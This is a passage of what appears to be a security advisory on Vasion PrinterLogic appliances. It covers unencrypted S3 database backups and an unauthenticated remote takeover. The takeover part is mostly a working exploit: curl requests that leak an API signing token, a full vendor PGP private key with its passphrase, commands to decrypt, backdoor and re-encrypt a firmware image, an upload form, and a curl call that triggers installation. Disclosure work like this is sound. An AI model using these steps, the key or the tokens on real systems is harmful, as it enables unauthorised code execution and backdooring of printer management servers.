 89      */
 90     public function createMySqlDbDumper(string $dbName): DbDumper
 91     {
 92         //startDBProxy returns connection name or false
 93         $connectionName = Saas::startDBProxy($dbName, false, false, false);
 94 
 95         $dbConfig = config("database.connections.{$connectionName}");
 96         if (is_null($dbConfig)) {
 97             throw Exception("Connection does not exist: " . $dbName);
 98         }
 99         $dbHost = Arr::get($dbConfig, 'read.host', Arr::get($dbConfig, 'host'));
100         $dbDumper = App::make(PrinterLogicMySql::class);
101         $dbDumper->setHost($dbHost ?? '')
102             ->setDbName($dbName)
103             ->setUserName($dbConfig['username'] ?? '')
104             ->setPassword($dbConfig['password'] ?? '');                                                                                                                                         
105         if (isset($dbConfig['port'])) {                                                                                                                                                         
106             $dbDumper = $dbDumper->setPort($dbConfig['port']);                                                                                                                                  
107         }                             
108         if (isset($dbConfig['dump'])) {
109             $dbDumper = static::processExtraDumpParameters($dbConfig['dump'], $dbDumper);
110         }
111         return $dbDumper;
112     }
113 }
</pre>

<p>The restore script <code>/var/www/app/Console/Commands/RestorePrinterInstaller.php</code> also does not include any decryption mechanism (on line 109):</p>
<p>Content of <code>/var/www/app/Console/Commands/RestorePrinterInstaller.php</code>:
<pre>
 24 class RestorePrinterInstaller extends Command
 25 {
[...]
 40     protected $description = 'Restore the Printer Installer Database';
 41 
<font color=red> 42     public const RETRIEVAL_DISK = 's3DbBackup';</font>
 43     public const ERR_EXCEPTION = -1;
 44     public const ERR_AWS_EXCEPTION = -2;
 45     public const ERR_EXISTING_DATABASE_EXCEPTION = -3;
 46     public const ERR_MISSING_FILE_EXCEPTION = -4;
 47     public const ERR_COMMAND_EXECUTION_EXCEPTION = -5;
 48 
 49 
 50     /<em><em>
 51      * Execute the console command.
 52      </em>
 53      * @return void
 54      </em>/
 55     public function handle()
 56     {
 57         $schema = $this-&gt;argument('original_schema_name');
 58         $restoreSchema = $this-&gt;argument('restore_schema_name');
 59         $uniqueKey = $this-&gt;argument('unique_key');
 60         $s3file = $schema . "<em>" . $uniqueKey . "_database.sql.gz";
 61 
 62         Log::notice("COMMAND START: " . implode(",", $this-&gt;arguments()));
 63         try {
 64             $this-&gt;info("Initiating Database backup for ... $schema");
 65 
 66             $exists = Storage::disk(self::RETRIEVAL_DISK)-&gt;exists($s3file);
 67             // If the file doesn't exist add the db prefix on and try again.
 68             if (!$exists) {
 69                 $s3file = config('saas.database_prefix', 'pi</em>') . $s3file;
 70                 $exists = Storage::disk(self::RETRIEVAL_DISK)-&gt;exists($s3file);
 71             }
 72 
 73             if (!$exists) {
 74                 $this-&gt;error("The file is missing");
 75                 return self::ERR_MISSING_FILE_EXCEPTION;
 76             }
 77             $this-&gt;info("I found the file $s3file on s3");
 78 
 79             $dbName = Saas::getDBName($restoreSchema);
 80             // Sets up a database proxy for the new connection so we can connect to the mysql server.
 81 
 82             Saas::startDBProxyForNonExistentSite($dbName, true);
 83 
 84             $this-&gt;info("dbName " . $dbName);
 85 
 86             // Create schema if doesn't exist
 87             MysqlService::createSchemaIfItDoesntExist($dbName);
 88 
 89             // Check if License table exists in schema.
 90             $exists = MysqlService::hasTableInSchema($dbName, 'license');
 91             // If the license table exists abort since the restore is going to overwrite an existing database.
 92             if ($exists) {
 93                 $this-&gt;error("Trying to restore $dbName over an existing database");
 94                 return self::ERR_EXISTING_DATABASE_EXCEPTION;
 95             }
 96 
 97             $fileUrl = Storage::disk(self::RETRIEVAL_DISK)-&gt;temporaryUrl($s3file, now()-&gt;addMinutes(15));
 98 
 99             // Get variables to use in the mysql command.
100             $connection = DB::connection();
101             $dbHost = $connection-&gt;getConfig('host');
102             $userName = $connection-&gt;getConfig('username');
103             $password = $connection-&gt;getConfig('password');
104                                                                                                                                                                                               <br />
105             $this-&gt;info("URL $fileUrl");                                                                                                                                                      <br />
106             // pull down the file with curl passing the silent (-s) flag                                                                                                                      <br />
107             // then pipe it into gunzip then pipe the results into mysql
<font color=red>108             $command =
109                 "curl -s '$fileUrl' | gunzip | mysql --user='$userName' --password='$password' --host=$dbHost $dbName";</font>
110             $returnVar = null;
111             $output = null;
112             // Execute the mysql command so we can stream the file instead of loading it to memory then passing it
113             // to mysql.
<font color=red>114             exec($command, $output, $returnVar);</font>
</pre></p>
<p>The backup files are not encrypted and are stored inside the <code>s3DbBackup</code> AWS Bucket.</p>
<p>If the AWS keys are exposed (e.g. using SSRF vulnerabilities), the clear-text backups can be downloaded by attackers.</p>
<p>Note: In February 2024, Vasion replied that this reported issue is a false positive:</p>
<blockquote>
<p>This code is not used to encrypt data. All data sent to S3 buckets is encrypted during encapsulation and encrypted at rest once within our VPC.</p>
</blockquote>
<h2>Vulnerabilities affecting the VA version</h2>
<h2>Identification of the solution</h2>
<p>Printerlogic VA version 
<img alt="" src="images/2025-vasion-report-2-local-version-01.png" /></p>
<p>Printerlogic VA version 
<img alt="" src="images/2025-vasion-report-2-local-version-02.png" /></p>
<p><a id="va-rce-02"></a></p>
<h2>Details - Remote take over of PrinterLogic instances (Remote Code Execution)</h2>
<p>It was observed that a specific webpage is reachable without authentication. This webpage provides a temporary token allowing an attacker to upload a malicious firmware image and overwrite the original firmware image running in the appliance. No credentials are required.</p>
<p>The firmware images are encrypted with the <code>PrinterLogic Virtual Appliance Team no-reply+virtualappliance@printerlogic.com</code> GPG key that can be freely extracted from the appliance. An attacker can simply download an update file, decrypt it, modify it by adding a backdoor, encrypt it with the GPG key and upload it using the temporary token. The malicious image will be then installed.</p>
<p>By visiting the webpage <code>/admin/design/management_accountts_pcabout.php</code>, the attacker will retrieve the secret token allowing uploading a new firmware image and installing it in the appliance:</p>
<p>Secret token allowing overwriting the firmware image:</p>
<pre>
kali% curl -kv http://10.105.0.60/admin/design/management_accountts_pcabout.php
*   Trying 10.105.0.60:80...
* Connected to 10.105.0.60 (10.105.0.60) port 80
> GET /admin/design/management_accountts_pcabout.php HTTP/1.1
> Host: 10.105.0.60
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 500 Internal Server Error
< Cache-Control: no-cache, private
< Content-Security-Policy: frame-ancestors 'self'
< Content-Type: text/html; charset=UTF-8
< Date: Tue, 26 Dec 2023 13:03:46 GMT
< Server: nginx
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< X-Xss-Protection: 1; mode=block
< Transfer-Encoding: chunked
< 
About PrinterLogic Virtual Appliance
    id="va-react-content"
    versions='{&quot;appliance&quot;:{&quot;previous&quot;:&quot;unavailable&quot;,&quot;current&quot;:&quot;20.0.2140&quot;,&quot;latest&quot;:&quot;unavailable&quot;,&quot;date&quot;:&quot;01\/01\/1970&quot;},&quot;host&quot;:{&quot;current&quot;:&quot;22.0.893&quot;,&quot;latest&quot;:&quot;unavailable&quot;},&quot;updating&quot;:{&quot;toVersion&quot;:&quot;&quot;}}'
<font color=red>    date='12/13/2023'
    updateAvailable=''
    apiSign='$2y$10$G6ykZQ5JwnrxCIiGLqEoA.MCQ6AmQAxSfSLk3dlnc5rwYH/o.0/OG'
    apiTimeStamp='2023-12-26 13:03:46'
    gwUrl='http://gw.10.105.0.60'</font>
[...]
</pre>

<p>Then, the attacker can install backdoors in an existing official image using the following GPG key (found in the appliance).</p>
<p>Steps:</p>
<ul>
<li>Installation of the GPG private key (obtained from the VA version);</li>
<li>Download of a recent version of an update file;</li>
<li>Decryption of the update file;</li>
<li>Modification of the update file;</li>
<li>Repack of the modified file;</li>
<li>Signature of the modified file;</li>
<li>Upload of the modified file.</li>
</ul>
<p>Depacking of an official image:</p>
<pre><code>kali# cp -r /dev/shm/./var-lib-docker/overlay2/af043a538447c099c971ed713f9d7cf8e5987ba0e52df08844e0a255b177c582/diff/home/ubuntu//.gnupg /home/user/

kali% gpg --list-secret-keys
/home/user/.gnupg/pubring.kbx
-----------------------------
sec#  rsa4096 2020-01-23 [SC]
      CADA0B06D8ADA5A72C52F5FB09BD9E367DA10998
uid           [ultimate] PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;
ssb   rsa4096 2020-01-23 [E]
ssb#  rsa4096 2020-01-23 [S]
kali% #gpg --export-secret-keys -a &gt; export.asc
[50370a0d-65b4-4b2a-a2a2-ea0d6ff35ef4]
kali% cat export.asc
-----BEGIN PGP PRIVATE KEY BLOCK-----
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
=/L1e
-----END PGP PRIVATE KEY BLOCK-----

kali% echo "From https://help.printerlogic.com/va/1-Printerlogic/Release_Notes/VA_Latest_App_Builds.htm" &gt; /dev/null
kali% wget https://appliance-cdn.printercloud.com/virtual-appliance-services/releases/20.0.2140/20.0.2140.gpg
--2023-12-26 08:16:04--  https://appliance-cdn.printercloud.com/virtual-appliance-services/releases/20.0.2140/20.0.2140.gpg
Resolving appliance-cdn.printercloud.com (appliance-cdn.printercloud.com)... 18.172.21.87, 18.172.21.120, 18.172.21.22, ...
Connecting to appliance-cdn.printercloud.com (appliance-cdn.printercloud.com)|18.172.21.87|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4953834807 (4.6G) [binary/octet-stream]
Saving to: '20.0.2140.gpg'
20.0.2140.gpg                                        100%[======================================================================================================================&gt;]   4.61G  14.6MB/s    in 6m 0s

2023-12-26 08:22:06 (13.1 MB/s) - '20.0.2140.gpg' saved [4953834807/4953834807]
kali% gpg 20.0.2140.gpg
+-------------------------------------------------------------------------------------+
| Please enter the passphrase to unlock the OpenPGP secret key:                       |
| "PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;" |
| 4096-bit RSA key, ID FCF4134A2496B21A,                                              |
| created 2020-01-23 (main key ID 09BD9E367DA10998).                                  |
|                                                                                     |
|                                                                                     |
| Passphrase: 50370a0d-65b4-4b2a-a2a2-ea0d6ff35ef4___________________________________ |
|                                                                                     |
|            &lt;OK&gt;                                                   &lt;Cancel&gt;          |
+-------------------------------------------------------------------------------------+
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;"
gpg: Signature made Mon Nov 27 18:35:49 2023 EST
gpg:                using RSA key 12FAF9092BFFB99A9751B92C890869BDA791E0EA
gpg:                issuer "no-reply+virtual-appliance@printerlogic.com"
gpg: Good signature from "PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;" [ultimate]
kali% ls -la
total 9672300
drwxr-xr-x 2 user user       4096 Dec 26 08:26 .
drwxr-xr-x 4 user user       4096 Dec 26 08:26 ..
-rw-r--r-- 1 user user 4950580344 Dec 26 08:25 20.0.2140
-rw-r--r-- 1 user user 4953834807 Dec  1 12:33 20.0.2140.gpg
kali% mkdir malicious-image &amp;&amp; cd malicious-image &amp;&amp; xzcat ../20.0.2140 | tar xvf -
versions.env
images.tar
pi-binaries.tar
kali% cat versions.env 
DOCKER_TAG_ADT="v1.0.161"
DOCKER_TAG_DOC="v1.0.176"
DOCKER_TAG_SES="v1.0.176"
DOCKER_TAG_STORAGE="v1.0.382"
DOCKER_TAG_TMS="v1.0.57"
DOCKER_TAG_POSTGRESTDE="15.4.7"
DOCKER_TAG_UNLEASH_VA_GW="1.0.34"
[...]
</code></pre>
<p>The files can be edited and the new malicious archive can be generated using this command:</p>
<pre><code>kali% tar cvf - versions.env images.tar pi-binaries.tar | xz - | gpg --encrypt -r no-reply+virtual-appliance@printerlogic.com -&gt; malicious.gpg
versions.env
images.tar
pi-binaries.tar
kali% ls -la malicious.gpg 
-rw-r--r-- 1 user user 4521768092 Dec 26 09:46 malicious.gpg
</code></pre>
<p>Then, the file can be uploaded using this custom webpage (the address must be adapted to contain the confidential tokens obtained from the <code>/admin/design/management_accountts_pcabout.php</code> webpage):</p>
<p>Custom HTML webpage to upload a malicious firmware image:</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action="http://gw.10.105.0.60/va-api/v1/update/1?sign=$2y$10$5kBEYJOxGtR1ydzZRIFYPO9WpXrCs10qUsDv4F7wAEw18kLhqWAau&amp;timeStamp=2024-01-04%2019:39:13" method="POST" enctype="multipart/form-data"&gt;
&lt;input type="file" name="package"&gt;
&lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/body&gt;
</code></pre>
<p>Custom HTML webpage to upload a malicious firmware image
<img alt="" src="images/2025-vasion-report-2-rce-upload-01.png" /></p>
<p>Upload done through the custom HTML webpage
<img alt="" src="images/2025-vasion-report-2-rce-upload-02.png" /></p>
<p>We can then start the update process using this curl command (using the same signature and same timestamp obtained previously).</p>
<p>Start of the installation process:</p>
<pre><code>kali% curl -X POST -kv 'http://gw.10.105.0.60/va-api/v1/update?version=1&amp;sign=$2y$10$5kBEYJOxGtR1ydzZRIFYPO9WpXrCs10qUsDv4F7wAEw18kLhqWAau&amp;timeStamp=2024-01-04%2019:39:13' 
* Host gw.10.105.0.60:80 was resolved.
* IPv6: (none)
* IPv4: 10.105.0.60
*   Trying 10.105.0.60:80...
* Connected to gw.10.105.0.60 (10.105.0.60) port 80
&gt; POST /va-api/v1/update?version=1&amp;sign=$2y$10$5kBEYJOxGtR1ydzZRIFYPO9WpXrCs10qUsDv4F7wAEw18kLhqWAau&amp;timeStamp=2024-01-04%2019:39:13 HTTP/1.1
&gt; Host: gw.10.105.0.60
&gt; User-Agent: curl/8.5.0
&gt; Accept: */* 
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Access-Control-Allow-Headers: *
&lt; Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
&lt; Access-Control-Allow-Origin: *
&lt; Cache-Control: no-cache, private
&lt; Content-Length: 9
&lt; Content-Type: application/json
&lt; Date: Thu, 04 Jan 2024 19:49:36 GMT 
&lt; Server: nginx
&lt; 
* Connection #0 to host gw.10.105.0.60 left intact
"Success"
</code></pre>
<p>When watching the appliance, we can see that the update process is running and the malicious firmware image is installed:</p>
<pre><code>root@printerlogic:/var/www/efs_storage/.updates# ps -auxww|grep gpg 
ubuntu    158698 57.6  0.0   5000  3060 ?        DL   19:50   0:15 gpg --pinentry-mode loopback --passphrase-fd 0 --output 1/1.tar.xz --decrypt /var/www/efs_storage/.updates/1.gpg
ubuntu    158725  0.5  0.0   2708   844 ?        Ssl  19:50   0:00 gpg-agent --homedir /home/ubuntu/.gnupg --use-standard-socket --daemon
root      163318  0.0  0.0   6608  2264 pts/2    S+   19:50   0:00 grep --color=auto gpg
</code></pre>
<p>An attacker can install backdoor without authentication in a PrinterLogic instance.</p>
<p>An attacker can get Remote Code Execution in a PrinterLogic instance.</p>
<p>The update process is reachable without admin privileges. </p>
<p><a id="va-rce-03"></a></p>
<h2>Details - Remote Code Execution and Leak of passwords using APIs</h2>
<p>It was observed that an attacker can exfiltrate passwords from the appliance by sending specific HTTP requests to the <code>/va-api</code> API endpoints.</p>
<p>Such APIs are incorrectly protected over the network:</p>
<ul>
<li>These API endpoints are exposed to the network without authentication;</li>
<li>Clear-text and valid credentials are freely displayed by the APIs.</li>
</ul>
<p>The <code>APP_KEY</code> variable used for Laravel is leaked and can be used to get Remote Code Execution against the instance of PrinterLogic. Remote Code executions using <code>APP_KEY</code> is possible (e.g. <a href="https://mogwailabs.de/en/blog/2022/08/exploiting-laravel-based-applications-with-leaked-app_keys-and-queues/">https://mogwailabs.de/en/blog/2022/08/exploiting-laravel-based-applications-with-leaked-app_keys-and-queues/</a>).</p>
<p>PoC - Extraction of a valid signature without authentication by visiting /admin/design/management_accountts_pcabout.php, without authentication:</p>
<pre><code>kali% curl -kv http://10.105.0.60/admin/design/management_accountts_pcabout.php
*   Trying 10.105.0.60:80...
* Connected to 10.105.0.60 (10.105.0.60) port 80
&gt; GET /admin/design/management_accountts_pcabout.php HTTP/1.1
[...]

    date='12/13/2023'
    updateAvailable=''
    apiSign='$2y$10$G6ykZQ5JwnrxCIiGLqEoA.MCQ6AmQAxSfSLk3dlnc5rwYH/o.0/OG'
    apiTimeStamp='2023-12-26 13:03:46'
    gwUrl='http://gw.10.105.0.60'
[...]
</code></pre>
